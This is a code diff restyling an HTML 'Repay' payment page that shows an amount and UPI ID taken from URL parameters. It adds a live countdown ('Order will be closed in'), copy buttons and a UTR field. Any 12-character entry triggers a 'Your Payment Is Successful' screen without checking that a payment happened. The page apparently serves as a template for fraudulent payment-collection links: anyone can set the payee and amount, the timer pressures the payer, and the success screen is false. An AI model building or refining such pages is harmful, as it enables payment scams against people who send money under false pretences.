@@ -3,115 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Repay Payment</title>
+    <title>Payment Page</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 0; background-color: #f8f9fa; }
-        .header { background: #ff4d4d; color: white; padding: 10px; text-align: center; font-weight: bold; position: relative; }
-        .header span { position: absolute; left: 15px; font-size: 20px; }
-        .sub-header { background: #0081ff; color: white; padding: 12px; text-align: center; font-size: 16px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; background-color: #fcfcfc; color: #333; }
+        .header { background: #ea5455; color: white; padding: 15px; font-weight: bold; display: flex; align-items: center; font-size: 18px; height: 20px; }
+        .back-btn { font-size: 24px; cursor: pointer; text-decoration: none; color: white; }
+        .sub-header { background: #3b82f6; color: white; padding: 12px; text-align: center; font-size: 16px; font-weight: 500; }
+        
         .container { padding: 15px; }
-        .order-timer { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; color: #333; font-size: 14px; }
-        .timer-box { background: #0081ff; color: white; padding: 2px 5px; border-radius: 3px; margin-left: 5px; }
+        .timer-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; font-size: 14px; color: #444; }
+        .t-unit { background: #3b82f6; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; margin: 0 2px; min-width: 15px; display: inline-block; text-align: center; }
+
+        .data-card { background: white; border: 1px solid #e5e7eb; border-radius: 8px; padding: 12px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .label { color: #6b7280; font-size: 14px; width: 30%; }
+        .val { font-weight: bold; font-size: 15px; color: #111827; flex-grow: 1; text-align: right; margin-right: 15px; }
+        .copy-btn { border: 1px solid #3b82f6; color: #3b82f6; background: white; padding: 6px 16px; border-radius: 4px; font-size: 13px; cursor: pointer; font-weight: 500; }
+
+        .help-link { color: #3b82f6; font-size: 13px; text-decoration: none; display: block; margin: 15px 0; }
         
-        .info-row { display: flex; justify-content: space-between; align-items: center; background: white; padding: 12px; border: 1px solid #ddd; border-radius: 5px; margin-bottom: 10px; }
-        .info-label { color: #666; font-size: 14px; }
-        .info-value { font-weight: bold; font-size: 16px; color: #333; }
-        .copy-btn { border: 1px solid #0081ff; color: #0081ff; background: white; padding: 5px 12px; border-radius: 4px; font-size: 12px; cursor: pointer; text-transform: uppercase; }
-        
-        .methods { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
-        .method-box { background: white; border: 1px solid #ddd; padding: 15px; border-radius: 8px; text-align: center; }
-        .method-box img { height: 25px; vertical-align: middle; }
-        
-        .utr-section { margin-top: 20px; }
-        .utr-label { color: #0081ff; font-size: 13px; margin-bottom: 10px; display: block; }
-        .utr-input-group { display: flex; align-items: center; background: white; border-bottom: 1px solid #eee; padding: 10px 0; }
-        .utr-input-group span { font-weight: bold; margin-right: 15px; color: #333; }
-        .utr-input-group input { border: none; outline: none; width: 100%; font-size: 15px; color: #ccc; }
-        
-        .submit-btn { background: #0081ff; color: white; border: none; width: 100%; padding: 15px; border-radius: 25px; font-size: 16px; margin-top: 20px; cursor: pointer; }
-        
-        .notice { color: #d9534f; font-size: 12px; margin-top: 20px; font-weight: bold; }
-        .notice p { margin: 5px 0; }
-        
-        /* Success Screen */
-        #success-view { display: none; text-align: center; padding: 50px 20px; background: white; height: 100vh; }
+        .grid-apps { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .app-box { background: white; border: 1px solid #e5e7eb; border-radius: 8px; height: 60px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .app-box img { max-height: 30px; width: auto; object-fit: contain; }
+
+        .utr-hint { color: #3b82f6; font-size: 13px; margin-bottom: 10px; display: block; }
+        .utr-input-box { background: white; border-bottom: 1px solid #f3f4f6; display: flex; align-items: center; padding: 12px 0; margin-bottom: 15px; }
+        .utr-input-box b { margin-right: 20px; font-size: 16px; }
+        .utr-input-box input { border: none; outline: none; font-size: 16px; width: 100%; color: #333; }
+
+        .submit-btn { background: #3b82f6; color: white; border: none; width: 100%; padding: 14px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; }
+
+        .notice { margin-top: 20px; font-size: 12px; font-weight: bold; color: #ef4444; }
+
+        #success-screen { display: none; text-align: center; padding: 50px 20px; background: white; height: 100vh; }
     </style>
 </head>
 <body>
 
-<div id="payment-view">
-    <div class="header"><span><</span> Repay</div>
+<div id="payment-page">
+    <div class="header"><span class="back-btn">‹</span></div>
     <div class="sub-header">Payment</div>
 
     <div class="container">
-        <div class="order-timer">
+        <div class="timer-row">
             <span>Order will be closed in:</span>
-            <span><span class="timer-box">8</span> : <span class="timer-box">45</span></span>
+            <span>
+                <span class="t-unit" id="m">8</span> : <span class="t-unit" id="s">45</span>
+            </span>
         </div>
 
-        <div class="info-row">
-            <span class="info-label">Amount</span>
-            <span class="info-value">₹ <span id="amt"></span></span>
-            <button class="copy-btn" onclick="copy('amt')">COPY</button>
+        <div class="data-card">
+            <span class="label">Amount</span>
+            <span class="val">₹ <span id="amnt"></span></span>
+            <button class="copy-btn" onclick="copy('amnt')">COPY</button>
         </div>
 
-        <div class="info-row" style="margin-bottom: 5px;">
-            <span class="info-label">VPA/UPI ID</span>
-            <span class="info-value" id="vpa" style="font-size: 14px;"></span>
+        <div class="data-card">
+            <span class="label">VPA/UPI ID</span>
+            <span class="val" id="vpa"></span>
             <button class="copy-btn" onclick="copy('vpa')">COPY</button>
         </div>
 
-        <div style="color: #0081ff; font-size: 12px; margin-bottom: 15px;">②How to transfer money🔗</div>
+        <a href="#" class="help-link">②How to transfer money🔗</a>
 
-        <div class="methods">
-            <div class="method-box"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo.png" alt="PhonePe"></div>
-            <div class="method-box"><img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Paytm_Logo.png" alt="Paytm"></div>
-            <div class="method-box"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Google_Pay_Logo.svg" alt="GPay"></div>
-            <div class="method-box"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/BHIM_Logo.png" alt="BHIM"></div>
+        <div class="grid-apps">
+            <div class="app-box"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo.png"></div>
+            <div class="app-box"><img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Paytm_Logo.png"></div>
+            <div class="app-box"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Google_Pay_Logo.svg"></div>
+            <div class="app-box"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/BHIM_Logo.png"></div>
         </div>
 
-        <div class="utr-section">
-            <span class="utr-label">↓ Fill the UTR numbers after you done payment</span>
-            <div class="utr-input-group">
-                <span>UTR</span>
-                <input type="text" id="utr_in" placeholder="Input UTR number" maxlength="12">
-            </div>
-            <button class="submit-btn" onclick="verify()">Submit UTR</button>
+        <div class="utr-hint">↓ Fill the UTR numbers after you done payment</div>
+        <div class="utr-input-box">
+            <b>UTR</b>
+            <input type="text" id="utr_input" placeholder="Input UTR number" maxlength="12">
         </div>
+
+        <button class="submit-btn" onclick="submitUTR()">Submit UTR</button>
 
         <div class="notice">
-            Notice:
-            <p>1. One UPI can only transfer money once.</p>
-            <p>2. Don't change the payment amount. Otherwise, the order cannot be closed.</p>
+            Notice:<br>
+            1. One UPI can only transfer money once.<br>
+            2. Don't change the payment amount. Otherwise, the order cannot be closed.
         </div>
     </div>
 </div>
 
-<div id="success-view">
-    <div style="font-size: 70px; color: #28a745; margin-bottom: 20px;">✔</div>
-    <h2 style="color: #28a745;">Your Payment Is Successful</h2>
-    <h3 style="color: #333;">Thank You For Staying With Us</h3>
-    <p style="color: #555; font-size: 18px;">Thank You So Much Sir/Ma'am</p>
+<div id="success-screen">
+    <div style="font-size: 70px; color: #10b981; margin-bottom: 20px;">✔</div>
+    <h2 style="color: #10b981;">Your Payment Is Successful</h2>
+    <h3 style="color: #374151;">Thank You For Staying With Us</h3>
+    <p style="color: #6b7280; font-size: 18px;">Thank You So Much Sir/Ma'am</p>
 </div>
 
 <script>
-    const params = new URLSearchParams(window.location.search);
-    document.getElementById('amt').innerText = params.get('amntInput') || "3500";
-    document.getElementById('vpa').innerText = params.get('vpaInput') || "riti****@slc";
+    const p = new URLSearchParams(window.location.search);
+    document.getElementById('amnt').innerText = p.get('amntInput') || "5200";
+    document.getElementById('vpa').innerText = p.get('vpaInput') || "444444784@axl";
+
+    // টাইমার ফাংশন (৮:৪৫ থেকে শুরু)
+    let totalSec = (8 * 60) + 45;
+    function startTimer() {
+        let timer = setInterval(function() {
+            let minutes = Math.floor(totalSec / 60);
+            let seconds = totalSec % 60;
+            document.getElementById('m').innerText = minutes;
+            document.getElementById('s').innerText = seconds < 10 ? '0' + seconds : seconds;
+            if (totalSec <= 0) clearInterval(timer);
+            totalSec--;
+        }, 1000);
+    }
+    startTimer();
 
     function copy(id) {
-        const text = document.getElementById(id).innerText;
-        navigator.clipboard.writeText(text);
-        alert("Copied: " + text);
+        const t = document.getElementById(id).innerText;
+        navigator.clipboard.writeText(t);
+        alert("Copied!");
     }
 
-    function verify() {
-        const utr = document.getElementById('utr_in').value;
-        if(utr.length === 12) {
-            document.getElementById('payment-view').style.display = 'none';
-            document.getElementById('success-view').style.display = 'block';
+    function submitUTR() {
+        const u = document.getElementById('utr_input').value;
+        if(u.length === 12) {
+            document.getElementById('payment-page').style.display = 'none';
+            document.getElementById('success-screen').style.display = 'block';
         } else {
-            alert("Please input 12 digit UTR number");
+            alert("Please enter a valid 12-digit UTR number");
         }
     }
 </script>
